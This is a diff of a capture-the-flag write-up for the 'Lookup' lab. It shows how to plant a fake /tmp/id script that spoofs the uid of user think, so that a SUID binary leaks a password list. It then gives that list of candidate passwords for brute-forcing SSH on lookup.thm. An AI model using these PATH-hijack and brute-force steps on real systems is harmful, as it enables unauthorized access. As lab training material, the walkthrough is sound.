@@ -269,24 +269,84 @@ echo $PATH
 now let's create `/tmp/id` with the following content..
 `#!/bin/bash`
 
-let's run the `usr/sbin/pwm` again..
+Create the script:
 
 ```bash
-/usr/sbin/pwm
-[i] Running 'id' command to extract the username and User ID (UID)
-[i] ID: think
+echo '#!/bin/sh' > /tmp/id
+```
+
+make the script executable
+
+```bash
+chmod +x /tmp/id
+```
+
+and..
+
+```bash
+echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
+```
+
+let's run the `usr/sbin/pwm` again..
+
+![Screenshot](/assets/img/Lookup/Screenshot%202024-11-30%20094645.png)
+
+what we got here looks like a password list, so let's save it in a file and let's try to bruteforce the user think.
+
+there is the password list:
+
+```c
 jose1006
 jose1004
 jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose`sbabygurl`
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
 ```
 
-what we got here looks like a password list, so let's save it in a file and let's try to brute force the user think.
-
-```bash
-[DATA] attacking ssh://lookup.thm:22/
-[22][ssh] host: lookup.thm   login: think   password: ***********
-```
- 
 Now we can login via ssh protocol with the password.
 
 ```bash
